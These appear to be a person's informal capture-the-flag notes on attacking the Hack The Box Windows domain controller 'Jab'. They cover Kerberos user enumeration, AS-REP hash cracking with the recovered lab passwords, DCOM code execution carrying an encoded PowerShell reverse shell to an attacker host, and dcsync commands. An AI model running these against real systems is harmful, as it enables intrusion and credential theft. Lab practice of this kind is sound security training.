## Jabber Machine - Windows

- [+]	Target IP
   >>	:10.10.11.4


## Recon
```nmap
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5222/tcp  open  xmpp-client
5223/tcp  open  hpvirtgrp
5262/tcp  open  unknown
5263/tcp  open  unknown
5269/tcp  open  xmpp-server
5270/tcp  open  xmp
5275/tcp  open  unknown
5276/tcp  open  unknown
5985/tcp  open  wsman
7070/tcp  open  realserver
7443/tcp  open  oracleas-https
7777/tcp  open  cbt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49694/tcp open  unknown
49701/tcp open  unknown
49773/tcp open  unknown
50465/tcp open  unknown

```
- [+] Port enum :	
   >>	Port 7070 openfire binding service 
   >>	5222/tcp open  xmpp-client
   >>	5269/tcp open  xmpp-server
   >>	53/tcp open  domain  Simple DNS Plus
   >>	88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-21 23:04:52Z)
   
   kerbrute userenum -d jab.htb --dc dc01.jab.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

   >>	135/tcp open  msrpc      Microsoft Windows RPC
   >>	593/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
   >>   389/tcp open  ldap          Microsoft Windows Active Directory LDAP 
		(Domain: jab.htb0., Site: Default-First-Site-Name)
		|_ssl-date: 2024-06-21T23:13:12+00:00; +4s from scanner time.
		| ssl-cert: Subject: commonName=DC01.jab.htb
   >>	445/tcp open  microsoft-ds
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

   >>	xmpp server connect to it with pidgin 
	search plugin shows users that already got with kerbrute
	maybe need to bruteforce users with same password as their username ?
	trying kerberoasting with users
   >>	
   >>	
   >>	
   >>	
hashcat -m 18200 file.hash /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$jmontgomery@JAB.HTB:1f25578988d68d430464bd51517906bb$98a20065c46c0a0a3acacd7be3dff0d020f61c1f88ee09a41ce9e1ead202d380b29ca0fe00657f01387c9e187f23a9ef863abc108ce73cb952b08fc8acbccac17d2c346aae9cbc250a01f3e18fb94f32f4afcb02102d551b33d261182de8d43cebdb7198e2e033e12774a3eea85dc5ed522d4475b17f097fb713a7c7818501efc801055ba834bdcfd3a67ec236cefff2e000e0fa7e52db1856119f0dd5d03a878dbcb448e70d1ba8011cbf019510575f851f72867ca29093b36be4c345d39baf90b7ee3f021538d77ee2d53b0a7c6953702431dd25ea75e2770a947fc288cd6f4231:Midnight_121

jmontgomery:Midnight_121 ## user in pidgin showwed a pentest room showing tgs 

svc_openfire:!@#$%^&*(1qazxsw
impacket-dcomexec -object MMC20 dc01.jab.htb/svc_openfire@10.10.11.4

smbclient -L  //10.10.11.4/ -U svc_openfire !@#$%^&*(1qazxsw
!@#$%^&*(1qazxsw
smbclient -L  //10.10.11.4/ -U jmontgomery%Midnight_121
smbclient //10.10.11.4/SYSLOG -U jmontgomery%Midnight_121

## Foothold
jab.htb/jmontgomery:Midnight_121


┌─[parrot@parrot]─[~/Desktop/HackingLab/HackTheBox/Machines/Jab]
└──╼ $nxc smb 10.10.11.4 -u jmontgomery -p Midnight_121 --shares
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.4      445    DC01             [+] jab.htb\jmontgomery:Midnight_121
SMB         10.10.11.4      445    DC01             [*] Enumerated shares
SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
SMB         10.10.11.4      445    DC01             -----           -----------     ------
SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.4      445    DC01             C$                              Default share
SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.4      445    DC01             SYSVOL          READ   



nxc ldap --bloudhound -ns -c All

The user SVC_OPENFIRE@JAB.HTB has membership in the Distributed COM Users local group on the computer DC01.JAB.HTB.

This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.


## User Privesc	


## Root 

impacket-dcomexec -object MMC20 dc01.jab.htb/svc_openfire@10.10.11.4 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand -debug








python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile users.txt -format hashcat -outputfile

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)



lsadump::dcsync /user:Administrator /domain:JAB.HTB

$ComputerName = DC01.JAB.HTB
lsadump::dcsync /user:DC01.JAB.HTB /domain:


PS C:\> net user svc_openfire
User name                    svc_openfire
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/22/2024 2:35:29 PM
Password expires             Never
Password changeable          1/23/2024 2:35:29 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/10/2024 7:10:41 PM

Logon hours allowed          All

Local Group Memberships      *Distributed COM Users
Global Group memberships     *Domain Users      

